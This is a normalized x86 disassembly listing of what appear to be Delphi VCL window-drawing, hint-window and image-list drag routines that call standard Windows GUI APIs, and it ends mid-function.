mov eax [ ebp - 0x4 ]
call sub_44c054
retn
inc esi
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x4 ]
mov dl [ edx + 0x5b ]
mov ecx edx
test cl cl
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edi [ ebp - 0x28 ]
sub edi [ ebp - 0x38 ]
jmp r-xdata
add cl 0xfd
sub cl 0x2
jae r-xdata
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
sub dl 0x3
jae r-xdata
xor edi edi
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44c4a8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
xor edx edx
mov [ ebp - 0x18 ] edx
mov edx [ ebp - 0x24 ]
sub edx [ ebp - 0x34 ]
mov [ ebp - 0x18 ] edx
jmp r-xdata
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov ecx [ eax + 0x44 ]
sub ecx [ ebp - 0x18 ]
mov edx [ eax + 0x40 ]
sub edx edi
mov ebx [ eax ]
call [ ebx + 0x84 ]
sub_450432
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
test al al
je r-xdata
mov eax [ ebp - 0x20 ]
sub eax [ ebp - 0x28 ]
test eax eax
jle r-xdata
add al 0xfd
sub al 0x2
jae r-xdata
mov eax [ ebp - 0x8 ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x48 ]
mov ecx [ ebp - 0x30 ]
sub ecx [ ebp - 0x38 ]
sub eax ecx
mov ecx [ ebp - 0x8 ]
mov [ ecx ] eax
cmp dl 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ eax + 0x5b ]
mov eax edx
sub al 0x3
jae r-xdata
mov al [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x24 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403564
jmp r-xdata
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
mov ecx [ ebp - 0x4 ]
add eax [ ecx + 0x4c ]
mov ecx [ ebp - 0x2c ]
sub ecx [ ebp - 0x34 ]
sub eax ecx
mov ecx [ ebp - 0xc ]
mov [ ecx ] eax
cmp dl 0x2
jne r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffd0
call sub_403564
jmp r-xdata
sub_4504c8
sub edx 0x1
jb r-xdata
cmp cl [ eax + 0x163 ]
je r-xdata
je r-xdata
retn
mov [ eax + 0x163 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a180
retn
cmp cl [ eax + 0x164 ]
je r-xdata
jmp r-xdata
mov [ eax + 0x164 ] cl
push 0x0
xor ecx ecx
mov edx 0xb03b
call sub_44a180
sub_45050c
push ebx
push ecx
mov [ esp ] dl
mov ebx eax
mov al [ ebx + 0x162 ]
cmp al [ esp ]
je r-xdata
pop edx
pop ebx
retn
mov al [ esp ]
mov [ ebx + 0x162 ] al
push 0x0
xor ecx ecx
mov edx 0xb03b
mov eax ebx
call sub_44a180
sub_45055c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax [ esi + 0x8 ]
mov esi eax
mov eax [ ebx + 0x16c ]
neg eax
push eax
mov edx [ ebx + 0x16c ]
neg edx
push eax
mov edi esi
push edi
call InflateRect
cmp [ ebx + 0x165 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
xor eax eax
cmp [ ebx + 0x163 ] 0x0
je r-xdata
cmp [ ebx + 0x164 ] 0x0
je r-xdata
add eax [ ebx + 0x168 ]
mov esi edi
test [ ebx + 0x162 ] 0x1
je r-xdata
add eax [ ebx + 0x168 ]
test [ ebx + 0x162 ] 0x2
je r-xdata
add [ esi ] eax
test [ ebx + 0x162 ] 0x4
je r-xdata
add [ esi + 0x4 ] eax
test [ ebx + 0x162 ] 0x8
je r-xdata
sub [ esi + 0x8 ] eax
sub [ esi + 0xc ] eax
sub_4505ec
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowDC
mov [ ebp - 0xc ] eax
xor edx edx
push ebp
push sub_450852
push [ fs : edx ]
mov [ fs : edx ] esp
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetClientRect
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowRect
push 0x2
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
push 0x0
call MapWindowPoints
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call ExcludeClipRect
lea esi [ ebp - 0x2c ]
lea edi [ ebp - 0x3c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x16c ]
push eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call InflateRect
lea esi [ ebp - 0x1c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x165 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x16c ] 0x0
jbe r-xdata
mov eax [ ebp - 0x20 ]
push eax
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call IntersectClipRect
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x2c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ ebp - 0x28 ]
neg eax
push eax
mov eax [ ebp - 0x2c ]
neg eax
push eax
lea eax [ ebp - 0x2c ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x170 ]
call sub_4249d8
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call FillRect
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
xor ebx ebx
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x163 ] 0x0
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx - 0x10 ]
call sub_43aed8
call sub_43afb8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x164 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x52 ] 0x2
je r-xdata
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowLongA
mov esi eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x1
je r-xdata
mov eax [ ebp - 0x4 ]
add ebx [ eax + 0x168 ]
call sub_43aed8
xor ecx ecx
mov edx [ ebp - 0x4 ]
call sub_43b66c
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x2
je r-xdata
sub [ ebp - 0x2c ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x4
je r-xdata
sub [ ebp - 0x28 ] ebx
test esi 0x200000
je r-xdata
add [ ebp - 0x24 ] ebx
mov eax [ ebp - 0x4 ]
test [ eax + 0x162 ] 0x8
je r-xdata
push 0x14
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x24 ] eax
test esi 0x100000
je r-xdata
add [ ebp - 0x20 ] ebx
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x162 ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x165 ]
or eax [ edx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x1a5 ]
or eax [ edx * 4 + rw-data ]
or eax 0x2000
push eax
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x163 ]
mov eax [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
movzx edx [ edx + 0x164 ]
or eax [ edx * 4 + rw-data ]
push eax
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0xc ]
push eax
call DrawEdge
push 0x15
mov eax [ rw-data ]
mov eax [ eax ]
call eax
add [ ebp - 0x20 ] eax
sub_450894
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov esi eax
cmp [ ebx + 0xc ] 0x0
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
push 0x0
lea edx [ esp + 0xc ]
mov eax [ ebx + 0x8 ]
call sub_406e48
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax esi
call sub_448af8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_44d0a0
mov edi eax
test edi edi
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx 0x7b
mov eax edi
call sub_44a180
mov [ ebx + 0xc ] eax
mov edx ebx
mov eax esi
call sub_44b344
sub_450900
push ebx
push esi
mov esi edx
call sub_45fd40
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
sub si 0x9
je r-xdata
push 0x0
mov dx 0x1
mov ax 0x2
call sub_406de0
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a180
jmp r-xdata
sub si 0x9
je r-xdata
push 0x0
mov dx 0x2
mov ax 0x2
call sub_406de0
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_44a180
add esi 0xffffffed
sub si 0x4
jae r-xdata
sub_450964
push esi
mov esi eax
cmp [ edx + 0xc ] 0x1
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
test [ edx + 0x8 ] 0x1
je r-xdata
mov eax esi
call sub_44d468
jmp r-xdata
cmp [ esi + 0x57 ] 0x0
je r-xdata
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_45099c
push ebx
push esi
mov ebx edx
mov esi eax
mov eax esi
call sub_450994
cmp bl al
je r-xdata
pop esi
pop ebx
retn
test bl bl
je r-xdata
mov eax [ r-xdata ]
not eax
and eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
mov eax [ r-xdata ]
or eax [ esi + 0x50 ]
mov [ esi + 0x50 ] eax
jmp r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4509dc
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44808c
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x160 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_450a38
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
cmp esi [ rw-data ]
jne r-xdata
mov eax [ esi + 0x160 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_448164
test bl bl
jle r-xdata
xor eax eax
call sub_44615c
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_450a78
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_424df8
xor eax eax
push ebp
push sub_450b13
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
call sub_4251ec
xor eax eax
push ebp
push sub_450af0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x8c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450af7
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x160 ]
xor edx edx
call sub_4251ec
retn
sub_450b24
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_451418
mov edx 0x80ffff
mov eax esi
call sub_449154
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x80 ]
mov eax [ esi + 0x208 ]
call sub_42508c
mov eax [ esi + 0x208 ]
mov eax [ eax + 0x14 ]
mov dl 0x1
call sub_424ac0
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_450b90
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_44c640
mov [ ebx + 0x4 ] 0x80800000
or [ ebx + 0x24 ] 0x800
cmp [ rw-data ] 0x0
je r-xdata
mov edx 0x1
mov eax 0x5
call sub_40c36c
test al al
je r-xdata
mov [ ebx + 0x8 ] 0x80
cmp [ rw-data ] 0x0
je r-xdata
or [ ebx + 0x24 ] 0x20000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_44c5d8
pop esi
pop ebx
retn
mov [ ebx + 0x8 ] 0x80
sub_450bfc
push ebp
mov ebp esp
add esp 0xfffffff8
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_450c52
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xcc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450c59
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ReleaseDC
retn
sub_450c60
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor edx edx
mov [ ebp - 0x14 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_450cf9
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x10 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
add [ ebp - 0x10 ] 0x2
add [ ebp - 0xc ] 0x2
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x80 ]
mov edx [ eax + 0x18 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0xc ]
call sub_4241d8
mov eax ebx
call sub_44b2ec
or eax 0x810
push eax
lea eax [ ebp - 0x10 ]
push eax
push 0xffffffff
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_448fb4
mov eax [ ebp - 0x14 ]
call sub_404624
push eax
mov eax [ ebx + 0x208 ]
call sub_42516c
push eax
call DrawTextA
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450d00
lea eax [ ebp - 0x14 ]
call sub_404164
retn
sub_450d08
push esi
mov eax [ edx + 0x4 ]
cmp eax 0x100
jb r-xdata
mov ecx [ edx + 0x4 ]
cmp ecx 0xb000
je r-xdata
cmp eax 0x108
jbe r-xdata
mov al 0x1
pop esi
retn
cmp ecx 0xb001
je r-xdata
cmp [ edx + 0x4 ] 0xb016
je r-xdata
cmp [ edx + 0x4 ] 0xb017
je r-xdata
cmp [ edx + 0x4 ] 0x111
je r-xdata
mov esi [ edx + 0x4 ]
cmp esi 0x200
jbe r-xdata
cmp [ edx + 0x4 ] 0xa0
je r-xdata
cmp esi 0x20a
jbe r-xdata
xor eax eax
pop esi
retn
sub_450d74
push ebp
mov ebp esp
push 0x0
push 0x0
push esi
mov esi eax
xor eax eax
push ebp
push sub_450dff
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
cmp [ esi + 0x210 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450e06
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_404188
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_448fb4
mov edx [ ebp - 0x4 ]
mov eax [ esi + 0x208 ]
call sub_424fcc
mov edx eax
add edx 0x6
mov eax esi
call sub_448748
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_448fb4
mov edx [ ebp - 0x8 ]
mov eax [ esi + 0x208 ]
call sub_424fe8
mov edx eax
add edx 0x4
mov eax esi
call sub_44876c
sub_450e0c
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx ecx
mov [ ebp - 0x4 ] eax
mov esi [ rw-data ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x1
xor eax eax
push ebp
push sub_450fe5
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_448fe4
add [ ebp - 0xc ] 0x4
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44a224
mov eax [ esi ]
call sub_466578
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x4c ]
add edx [ ebp - 0x14 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_466584
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0x48 ]
add edx [ ebp - 0x18 ]
cmp eax edx
jge r-xdata
mov eax [ esi ]
call sub_466578
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x4c ]
mov [ ebp - 0x14 ] eax
mov eax [ esi ]
call sub_46656c
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov eax [ esi ]
call sub_466584
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x48 ]
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
call sub_466560
cmp eax [ ebp - 0xc ]
jle r-xdata
mov eax [ esi ]
call sub_46656c
mov [ ebp - 0x18 ] eax
push 0x10
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x48 ]
push eax
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x18 ]
push eax
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call SetWindowPos
call GetTickCount
mov edx [ ebp - 0x4 ]
sub eax [ edx + 0x214 ]
cmp eax 0xfa
jbe r-xdata
mov eax [ esi ]
call sub_466560
mov [ ebp - 0xc ] eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x30 ]
mov eax [ ebp - 0x4 ]
call sub_44cee8
push 0x4
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call ShowWindow
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_450fec
call GetTickCount
mov edx [ ebp - 0x4 ]
mov [ edx + 0x214 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x210 ] 0x0
retn
mov eax ebx
call sub_404424
cmp eax 0x64
jge r-xdata
cmp [ rw-data ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1016
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
push 0x0
lea eax [ ebp - 0x8 ]
push eax
push 0x0
push 0x1018
call SystemParametersInfoA
cmp [ ebp - 0x8 ] 0x0
je r-xdata
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_454060
mov eax [ ebp - 0x1c ]
cmp eax [ ebp - 0x14 ]
jle r-xdata
mov bl 0x2
jmp r-xdata
mov bl 0x1
xor ebx ebx
jmp r-xdata
xor eax eax
mov al bl
mov eax [ eax * 4 + rw-data ]
or eax 0x40000
push eax
push 0x64
mov eax [ ebp - 0x4 ]
call sub_44f7b4
push eax
call [ rw-data ]
sub_450ff4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x10 ]
mov ebx [ eax ]
call [ ebx + 0xd0 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_45101c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov ebx [ ebp + 0x8 ]
push 0x0
push ebx
mov ecx edi
xor edx edx
xor eax eax
call sub_417264
mov eax esi
call sub_44b2ec
or eax 0xc10
push eax
push ebx
push 0xffffffff
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ esi + 0x208 ]
call sub_42516c
push eax
call DrawTextA
add [ ebx + 0x8 ] 0x6
add [ ebx + 0xc ] 0x2
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_451078
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4c ]
push eax
lea eax [ esp + 0x4 ]
push eax
mov ecx [ ebx + 0x48 ]
xor edx edx
xor eax eax
call sub_417264
call sub_43aed8
call sub_43afb8
test al al
jne r-xdata
call sub_43aed8
lea ecx [ esp + 0x10 ]
mov dl 0x1
call sub_43b2e0
push esp
push 0x1
push 0xf
push 0x0
call sub_43aed8
lea ecx [ esp + 0x20 ]
mov edx esi
call sub_43b028
push 0xf
push 0x1
lea eax [ esp + 0x8 ]
push eax
push esi
call DrawEdge
jmp r-xdata
add esp 0x1c
pop esi
pop ebx
retn
sub_4510e4
push ebx
push esi
mov esi edx
mov ebx eax
push 0x0
mov edx [ esi + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_44d7f0
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
pop esi
pop ebx
retn
sub_451108
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov ebx eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] ecx
lea eax [ ebp - 0x8 ]
push eax
push ebx
call ClientToScreen
lea eax [ ebp - 0x18 ]
push eax
push ebx
call GetWindowRect
mov eax [ ebp - 0x8 ]
sub eax [ ebp - 0x18 ]
mov [ esi ] eax
mov eax [ ebp - 0x4 ]
sub eax [ ebp - 0x14 ]
mov [ esi + 0x4 ] eax
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_451148
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
cmp [ ebx + 0x68 ] 0xffff
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
push 0x1
push 0x1
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
push 0xd
mov eax [ rw-data ]
mov eax [ eax ]
call eax
push eax
call ImageList_Create
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_451208
push [ fs : eax ]
mov [ fs : eax ] esp
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429f60
movsx edx [ ebx + 0x68 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_466a94
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_429f60
push 0x0
push 0x0
push 0x0
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
lea eax [ ebp - 0xc ]
push eax
push 0x0
call ImageList_GetDragImage
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebp - 0x4 ]
push eax
call ImageList_SetDragCursorImage
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
push eax
call ImageList_Destroy
retn
sub_451214
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0x78 ] esi
mov [ ebx + 0x70 ] edi
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x74 ] eax
mov eax [ ebp + 0x8 ]
push eax
push edi
push esi
mov eax ebx
call sub_4561e4
push eax
call ImageList_BeginDrag
mov al 0x1
mov [ ebx + 0x6a ] al
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_451274
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
xor ebx ebx
mov eax esi
call sub_4560a8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
cmp [ esi + 0x6a ] 0x0
jne r-xdata
mov eax esi
call sub_451148
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax esi
call sub_4512d4
mov ebx eax
test bl bl
je r-xdata
mov eax [ esi + 0x74 ]
push eax
mov ecx [ esi + 0x70 ]
mov edx [ esi + 0x78 ]
mov eax esi
call sub_451214
push 0x0
call ShowCursor
sub_4512d4
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov esi edx
mov edi eax
xor ebx ebx
mov eax edi
call sub_4560a8
test al al
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp esi [ edi + 0x6c ]
je r-xdata
mov eax edi
call sub_451338
mov ebx esi
mov [ edi + 0x6c ] ebx
lea eax [ ebp - 0xc ]
push eax
mov ecx [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_451108
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ edi + 0x6c ]
push eax
call ImageList_DragEnter
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_451338
push ebx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
pop ebx
retn
cmp [ ebx + 0x6c ] 0x0
je r-xdata
mov eax [ ebx + 0x6c ]
push eax
call ImageList_DragLeave
xor eax eax
mov [ ebx + 0x6c ] eax
sub_45135c
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_4560a8
test al al
je r-xdata
xor eax eax
push esp
mov ecx edi
mov edx esi
mov eax [ ebx + 0x6c ]
call sub_451108
mov eax [ esp + 0x4 ]
push eax
mov eax [ esp + 0x4 ]
push eax
call ImageList_DragMove
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
sub_4513d0
push ebx
push esi
mov esi eax
mov eax esi
call sub_4560a8
test al al
je r-xdata
xor ebx ebx
cmp [ esi + 0x6a ] 0x0
je r-xdata
mov eax esi
call sub_451338
call ImageList_EndDrag
cmp eax 0x1
sbb ebx ebx
inc ebx
mov [ esi + 0x6a ] 0x0
or edx 0xffffffff
mov eax esi
call sub_45125c
push 0xffffffff
call ShowCursor
jmp r-xdata
mov eax ebx
pop esi
pop ebx
retn
sub_451418
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_44b4e0
mov dl 0x1
mov eax [ r-xdata ]
call sub_424af4
mov esi eax
mov [ ebx + 0x208 ] esi
mov eax esi
mov edx ebx
call sub_447b68
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_451474
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_44b604
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_4514c4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
